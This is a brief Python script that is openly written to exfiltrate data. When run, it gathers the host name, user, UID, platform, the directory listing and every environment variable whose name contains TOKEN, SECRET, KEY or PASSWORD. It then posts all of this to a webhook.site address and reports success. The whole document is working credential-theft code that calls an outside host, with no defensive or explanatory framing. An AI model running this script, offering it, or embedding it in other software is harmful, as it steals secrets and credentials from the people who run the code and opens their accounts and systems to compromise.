import os
import requests
import socket
import platform

 
WEBHOOK_URL = "https://webhook.site/7c0dc567-3ce3-4b87-8393-1ea64c832f20"

def exfiltrate_data():
 
    data = {
        "hostname": socket.gethostname(),
        "user": os.getlogin() if hasattr(os, 'getlogin') else "unknown",
        "uid": os.getuid() if hasattr(os, 'getuid') else "unknown",
        "platform": platform.platform(),
 
        "env_vars": {k: v for k, v in os.environ.items() if any(s in k.upper() for s in ['TOKEN', 'SECRET', 'KEY', 'PASSWORD'])},
        "file_list": os.listdir('.') if os.path.exists('.') else []
    }
    
    try:
        requests.post(WEBHOOK_URL, json=data)
        print("Data exfiltrated successfully.")
    except Exception as e:
        print(f"Failed to exfiltrate: {e}")

if __name__ == "__main__":
    exfiltrate_data()
